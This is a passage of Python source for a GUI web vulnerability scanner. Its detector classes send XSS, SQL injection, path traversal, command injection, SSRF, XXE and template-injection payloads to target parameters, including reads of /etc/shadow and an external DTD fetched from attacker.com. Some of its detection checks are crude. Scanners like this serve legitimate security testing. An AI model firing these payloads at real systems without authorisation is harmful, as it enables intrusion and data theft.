            response = self.make_request(url)
            if not response:
                return
                
            html = response.text
            
            # Test all modules
            findings = []
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = []
                for module in self.modules.values():
                    if isinstance(module, TechDetector):
                        continue  # Skip tech detection for single URL tests
                    future = executor.submit(module.scan, url, html)
                    future.add_done_callback(self.handle_findings)
                    futures.append(future)
                
                wait(futures)
            
            self.status_callback(f"Completed testing: {url}", "success")
        except Exception as e:
            self.status_callback(f"Failed to test {url}: {str(e)}", "error")
            logger.error(f"Failed to test {url}: {str(e)}")

    def show_network_info(self, url):
        """Collect and display basic network information"""
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            
            info = []
            
            # Get IP address
            try:
                ip = socket.gethostbyname(hostname)
                info.append(f"Resolved IP: {ip}")
            except socket.gaierror:
                info.append("Could not resolve hostname")
            
            # Get port
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            info.append(f"Port: {port}")
            
            # SSL certificate info for HTTPS
            if parsed.scheme == 'https':
                try:
                    context = ssl.create_default_context()
                    with socket.create_connection((hostname, port), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            cert = ssock.getpeercert()
                            info.append(f"SSL Issuer: {cert['issuer'][1][0][1]}")
                            info.append(f"Valid From: {cert['notBefore']}")
                            info.append(f"Valid Until: {cert['notAfter']}")
                except Exception as e:
                    info.append(f"SSL Error: {str(e)}")
            
            self.status_callback(" | ".join(info), "info")
        except Exception as e:
            logger.error(f"Network info error: {str(e)}")

    def stop(self):
        """Stop the current scan"""
        self.stop_event.set()
        self.status_callback("Stopping scan...", "warning")

    def pause(self):
        """Pause the current scan"""
        self.pause_event.set()
        self.paused = True
        self.status_callback("Scan paused", "warning")

    def resume(self):
        """Resume paused scan"""
        self.pause_event.clear()
        self.paused = False
        self.status_callback("Scan resumed", "info")

class VulnerabilityModule:
    """Base class for vulnerability modules"""
    def __init__(self):
        self.name = "Base Module"
        self.severity = "medium"
        self.confidence = "medium"
    
    def scan(self, url, html):
        """Scan for vulnerabilities"""
        return []
    
    def test_payload(self, url, param, payload):
        """Test a specific payload"""
        return False
    
    def get_reflections(self, url, html):
        """Find reflection points in response"""
        reflections = {}
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            if params[param][0] in html:
                reflections[param] = []
                for match in re.finditer(re.escape(params[param][0]), html):
                    reflections[param].append(match.start())
        
        return reflections

class XSSDetector(VulnerabilityModule):
    """XSS Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "Cross-Site Scripting (XSS)"
        self.severity = "high"
        
        # Context-aware payloads
        self.payloads = [
            {"context": "html", "payload": "<script>alert(1)</script>", "evidence": "Script tag injection"},
            {"context": "html", "payload": "<img src=x onerror=alert(1)>", "evidence": "Image with error handler"},
            {"context": "html", "payload": "'\"><svg/onload=alert(1)>", "evidence": "SVG tag injection"},
            {"context": "attribute", "payload": "\" onmouseover=alert(1) x=\"", "evidence": "Attribute event handler"},
            {"context": "javascript", "payload": "';alert(1)//", "evidence": "JavaScript break out"},
            {"context": "javascript", "payload": "\\\"-alert(1)}//", "evidence": "JavaScript escape"},
            {"context": "html", "payload": "<iframe src=\"javascript:alert(1)\">", "evidence": "Iframe injection"},
            {"context": "html", "payload": "<object data=\"javascript:alert(1)\">", "evidence": "Object injection"},
            {"context": "html", "payload": "<embed src=\"javascript:alert(1)\">", "evidence": "Embed injection"},
            {"context": "html", "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "evidence": "Filter bypass"}
        ]
    
    def scan(self, url, html):
        """Scan for XSS vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'context': payload_info["context"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'high' if payload_info["context"] != 'html' else 'medium',
                        'details': f"XSS vulnerability found in parameter '{param}' with {payload_info['context']} context"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test XSS payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        # Rebuild URL with payload
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            response = requests.get(test_url, timeout=10)
            return payload in response.text
        except requests.RequestException:
            return False

class SQLiDetector(VulnerabilityModule):
    """SQL Injection Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "SQL Injection"
        self.severity = "critical"
        
        self.payloads = [
            {"payload": "' OR '1'='1", "evidence": "Basic boolean injection"},
            {"payload": "' OR 1=1--", "evidence": "SQL comment bypass"},
            {"payload": "\" OR \"\"=\"", "evidence": "Double quote injection"},
            {"payload": "' OR ''='", "evidence": "Single quote injection"},
            {"payload": "' OR 1=1#", "evidence": "Hash comment bypass"},
            {"payload": "' OR 1=1-- -", "evidence": "SQL comment with space"},
            {"payload": "' UNION SELECT null,username,password FROM users--", "evidence": "Union-based injection"},
            {"payload": "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--", "evidence": "Error-based injection"},
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "evidence": "Time-based injection"},
            {"payload": "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--", "evidence": "Blind time-based injection"}
        ]
    
    def scan(self, url, html):
        """Scan for SQL injection vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'medium',  # Requires manual verification
                        'details': f"SQL injection vulnerability found in parameter '{param}'"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test SQLi payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            response = requests.get(test_url, timeout=10)
            return any(
                error in response.text.lower()
                for error in ['sql syntax', 'mysql', 'ora-', 'syntax error']
            )
        except requests.RequestException:
            return False

class LFIDetector(VulnerabilityModule):
    """Local File Inclusion Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "Local File Inclusion"
        self.severity = "high"
        
        self.payloads = [
            {"payload": "../../../../etc/passwd", "evidence": "Unix passwd file access"},
            {"payload": "....//....//....//....//....//etc/passwd", "evidence": "Path traversal obfuscation"},
            {"payload": "%2e%2e%2fetc%2fpasswd", "evidence": "URL-encoded traversal"},
            {"payload": "file:///etc/passwd", "evidence": "File protocol access"},
            {"payload": "../../../../Windows/System32/drivers/etc/hosts", "evidence": "Windows hosts file access"},
            {"payload": "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", "evidence": "Windows path traversal"},
            {"payload": "C:\\Windows\\System32\\drivers\\etc\\hosts", "evidence": "Absolute Windows path"},
            {"payload": "/proc/self/environ", "evidence": "Linux proc access"},
            {"payload": "/etc/shadow", "evidence": "Unix shadow file access"},
            {"payload": "../../../../boot.ini", "evidence": "Windows boot.ini access"}
        ]
    
    def scan(self, url, html):
        """Scan for LFI vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'medium',  # Requires manual verification
                        'details': f"LFI vulnerability found in parameter '{param}'"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test LFI payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            response = requests.get(test_url, timeout=10)
            return "root:" in response.text or "<html" not in response.text
        except requests.RequestException:
            return False

class RCEDetector(VulnerabilityModule):
    """Remote Code Execution Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "Remote Code Execution"
        self.severity = "critical"
        
        self.payloads = [
            {"payload": ";id", "evidence": "Command separator test"},
            {"payload": "|id", "evidence": "Pipe command test"},
            {"payload": "`id`", "evidence": "Backtick execution"},
            {"payload": "$(id)", "evidence": "Command substitution"},
            {"payload": "|| id", "evidence": "OR command execution"},
            {"payload": "&& id", "evidence": "AND command execution"},
            {"payload": "sleep 5", "evidence": "Time delay test"},
            {"payload": "ping -c 5 127.0.0.1", "evidence": "Network ping test"},
            {"payload": "echo vulnerable", "evidence": "Command output test"},
            {"payload": "whoami", "evidence": "Current user test"}
        ]
    
    def scan(self, url, html):
        """Scan for RCE vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'low',  # Requires manual verification
                        'details': f"Potential RCE vulnerability found in parameter '{param}'"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test RCE payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            start = time.time()
            requests.get(test_url, timeout=10)
            elapsed = time.time() - start
            
            # Check if command caused delay
            if "sleep" in payload or "ping" in payload:
                return elapsed > 4
            return False
        except requests.RequestException:
            return False

class SSRDetector(VulnerabilityModule):
    """Server-Side Request Forgery Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "SSRF"
        self.severity = "high"
        
        self.payloads = [
            {"payload": "http://169.254.169.254/latest/meta-data/", "evidence": "AWS metadata endpoint"},
            {"payload": "http://localhost/admin", "evidence": "Localhost access"},
            {"payload": "file:///etc/passwd", "evidence": "File protocol access"},
            {"payload": "http://127.0.0.1:8080", "evidence": "Local port scan"},
            {"payload": "http://internal.example.com", "evidence": "Internal network access"},
            {"payload": "dict://localhost:6379/info", "evidence": "Redis protocol"},
            {"payload": "gopher://localhost:6379/_INFO", "evidence": "Gopher protocol"},
            {"payload": "http://[::1]/", "evidence": "IPv6 localhost"},
            {"payload": "http://0.0.0.0/", "evidence": "All interfaces"},
            {"payload": "http://attacker.com", "evidence": "External domain"}
        ]
    
    def scan(self, url, html):
        """Scan for SSRF vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'medium',
                        'details': f"SSRF vulnerability found in parameter '{param}'"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test SSRF payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            response = requests.get(test_url, timeout=10)
            return payload in response.text
        except requests.RequestException:
            return False

class XXEDetector(VulnerabilityModule):
    """XML External Entity Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "XXE"
        self.severity = "high"
        
        self.payloads = [
            {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", 
             "evidence": "Basic XXE file read"},
            {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>", 
             "evidence": "External DTD inclusion"},
            {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>", 
             "evidence": "PHP filter wrapper"},
            {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>", 
             "evidence": "Expect wrapper"},
            {"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>", 
             "evidence": "Alternative syntax"}
        ]
    
    def scan(self, url, html):
        """Scan for XXE vulnerabilities"""
        findings = []
        
        if any(pattern in html.lower() for pattern in ['<xml', '<?xml', 'application/xml', 'text/xml']):
            for payload_info in self.payloads:
                findings.append({
                    'type': self.name,
                    'url': url,
                    'payload': payload_info["payload"],
                    'evidence': payload_info["evidence"],
                    'severity': self.severity,
                    'confidence': 'low',
                    'note': 'Potential XXE. Manual testing required.',
                    'details': f"Potential XXE vulnerability detected. Test with: {payload_info['payload']}"
                })
        
        return findings

class IDORDetector(VulnerabilityModule):
    """Insecure Direct Object Reference Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "IDOR"
        self.severity = "medium"
    
    def scan(self, url, html):
        """Scan for IDOR vulnerabilities"""
        findings = []
        
        # Look for numeric IDs in URLs
        parsed = urlparse(url)
        path_segments = parsed.path.split('/')
        query_params = parse_qs(parsed.query)
        
        # Check path segments
        for segment in path_segments:
            if segment.isdigit():
                findings.append({
                    'type': self.name,
                    'url': url,
                    'evidence': f"Numeric ID in path: {segment}",
                    'severity': self.severity,
                    'confidence': 'low',
                    'details': f"Potential IDOR vulnerability with numeric ID '{segment}' in URL path"
                })
        
        # Check query parameters
        for param, values in query_params.items():
            if any(v.isdigit() for v in values):
                findings.append({
                    'type': self.name,
                    'url': url,
                    'evidence': f"Numeric ID in parameter: {param}",
                    'severity': self.severity,
                    'confidence': 'low',
                    'details': f"Potential IDOR vulnerability with numeric ID in parameter '{param}'"
                })
        
        return findings

class CSRFDetector(VulnerabilityModule):
    """Cross-Site Request Forgery Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "CSRF"
        self.severity = "medium"
    
    def scan(self, url, html):
        """Scan for CSRF vulnerabilities"""
        findings = []
        soup = BeautifulSoup(html, 'html.parser')
        
        # Check for forms without CSRF tokens
        for form in soup.find_all('form'):
            if not form.find('input', {'name': 'csrf_token'}) and \
               not form.find('input', {'name': 'csrf'}) and \
               not form.find('input', {'name': '_token'}):
                method = form.get('method', 'GET').upper()
                if method == 'POST':
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'evidence': "Form without CSRF protection",
                        'severity': self.severity,
                        'confidence': 'medium',
                        'details': "Form submission may be vulnerable to CSRF"
                    })
        
        return findings

class SSTIDetector(VulnerabilityModule):
    """Server-Side Template Injection Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "SSTI"
        self.severity = "high"
        
        self.payloads = [
            {"payload": "{{7*7}}", "evidence": "Basic expression test"},
            {"payload": "${7*7}", "evidence": "Expression language test"},
            {"payload": "<%= 7*7 %>", "evidence": "ERB template test"},
            {"payload": "#{7*7}", "evidence": "Ruby interpolation test"},
            {"payload": "${{7*7}}", "evidence": "Twig template test"},
            {"payload": "@(7*7)", "evidence": "Razor template test"},
            {"payload": "{7*7}", "evidence": "Smarty template test"},
            {"payload": "{{7*'7'}}", "evidence": "Twig string concat test"},
            {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }", 
             "evidence": "Freemarker RCE test"},
            {"payload": "#set($e=\"exp\")${$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")}", 
             "evidence": "Velocity RCE test"}
        ]
    
    def scan(self, url, html):
        """Scan for SSTI vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'medium',
                        'details': f"Potential SSTI vulnerability in parameter '{param}'"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test SSTI payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            response = requests.get(test_url, timeout=10)
            return "49" in response.text or "id" in response.text
        except requests.RequestException:
            return False

class OpenRedirectDetector(VulnerabilityModule):
    """Open Redirect Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "Open Redirect"
        self.severity = "medium"
        
        self.payloads = [
            {"payload": "https://attacker.com", "evidence": "External domain"},
            {"payload": "//attacker.com", "evidence": "Protocol-relative URL"},
            {"payload": "http://google.com", "evidence": "Common domain"},
            {"payload": "/\\attacker.com", "evidence": "Backslash bypass"},
            {"payload": "http:attacker.com", "evidence": "Missing slashes"}
        ]
    
    def scan(self, url, html):
        """Scan for open redirect vulnerabilities"""
        findings = []
        reflections = self.get_reflections(url, html)
        
        for param, positions in reflections.items():
            for payload_info in self.payloads:
                if self.test_payload(url, param, payload_info["payload"]):
                    findings.append({
                        'type': self.name,
                        'url': url,
                        'param': param,
                        'payload': payload_info["payload"],
                        'evidence': payload_info["evidence"],
                        'severity': self.severity,
                        'confidence': 'medium',
                        'details': f"Open redirect vulnerability found in parameter '{param}'"
                    })
        
        return findings
    
    def test_payload(self, url, param, payload):
        """Test open redirect payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            response = requests.get(test_url, timeout=10, allow_redirects=False)
            return 300 <= response.status_code < 400 and payload in response.headers.get('Location', '')
        except requests.RequestException:
            return False

class CORSDetector(VulnerabilityModule):
    """CORS Misconfiguration Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "CORS Misconfiguration"
        self.severity = "medium"
    
    def scan(self, url, html):
        """Scan for CORS misconfigurations"""
        findings = []
        
        try:
            # Send request with Origin header
            headers = {'Origin': 'https://attacker.com'}
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check for Access-Control-Allow-Origin header
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', 'false').lower() == 'true'
            
            if acao == '*':
                findings.append({
                    'type': self.name,
                    'url': url,
                    'evidence': "Wildcard CORS policy (*)",
                    'severity': self.severity,
                    'confidence': 'high',
                    'details': "CORS policy allows any domain (Access-Control-Allow-Origin: *)"
                })
            elif 'attacker.com' in acao:
                findings.append({
                    'type': self.name,
                    'url': url,
                    'evidence': f"Reflects origin: {acao}",
                    'severity': self.severity,
                    'confidence': 'high',
                    'details': "CORS policy reflects arbitrary origin"
                })
            
            if acac and acao != '*':
                findings.append({
                    'type': self.name,
                    'url': url,
                    'evidence': "Allows credentials with specific origin",
                    'severity': "high",
                    'confidence': 'medium',
                    'details': "CORS policy allows credentials (Access-Control-Allow-Credentials: true)"
                })
                
        except requests.RequestException:
            pass
            
        return findings

class TechDetector(VulnerabilityModule):
    """Technology Stack Detection Module"""
    def __init__(self):
        super().__init__()
        self.name = "Technology Detection"
        self.severity = "info"
        self.confidence = "high"
        
        # Common technology signatures with evidence patterns
        self.signatures = [
            {"name": "Apache", "patterns": [r'Server:\s*Apache', r'<meta name="generator" content="Apache'], "confidence": "high"},
            {"name": "Nginx", "patterns": [r'Server:\s*nginx'], "confidence": "high"},
            {"name": "IIS", "patterns": [r'Server:\s*Microsoft-IIS'], "confidence": "high"},
            {"name": "PHP", "patterns": [r'X-Powered-By:\s*PHP', r'\.php\?'], "confidence": "high"},
            {"name": "WordPress", "patterns": [r'wp-content', r'wp-includes', r'WordPress'], "confidence": "high"},
            {"name": "Drupal", "patterns": [r'sites/all/', r'Drupal'], "confidence": "medium"},
            {"name": "Joomla", "patterns": [r'media/system/js/', r'Joomla'], "confidence": "medium"},
            {"name": "jQuery", "patterns": [r'jquery\.js', r'jquery.min.js'], "confidence": "high"},
            {"name": "React", "patterns": [r'react\.js', r'react.min.js'], "confidence": "medium"},
            {"name": "Node.js", "patterns": [r'X-Powered-By:\s*Express'], "confidence": "medium"},
            {"name": "Ruby on Rails", "patterns": [r'X-Powered-By:\s*Ruby'], "confidence": "medium"},
            {"name": "Django", "patterns": [r'csrfmiddlewaretoken'], "confidence": "medium"},
            {"name": "Laravel", "patterns": [r'_token', r'X-Powered-By:\s*Laravel'], "confidence": "medium"},
            {"name": "Spring", "patterns": [r'org.springframework'], "confidence": "medium"},
            {"name": "ASP.NET", "patterns": [r'__VIEWSTATE', r'ASP.NET'], "confidence": "high"}
        ]
    
    def scan(self, url, html):
        """Detect technologies used by the target"""
        findings = []
        
        try:
            response = requests.get(url, timeout=10)
            headers = str(response.headers).lower()
            content = response.text.lower()
            
            for tech in self.signatures:
                for pattern in tech["patterns"]:
                    if re.search(pattern, headers, re.IGNORECASE) or re.search(pattern, content, re.IGNORECASE):
                        findings.append({
                            'type': self.name,
                            'url': url,
                            'details': f"Detected {tech['name']}",
                            'evidence': f"Matched pattern: {pattern}",
                            'severity': self.severity,
                            'confidence': tech["confidence"]
                        })
                        break  # Found one pattern, no need to check others
        except requests.RequestException:
            pass
            
        return findings

if __name__ == "__main__":
    root = tk.Tk()
    app = CyberBlitzUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()
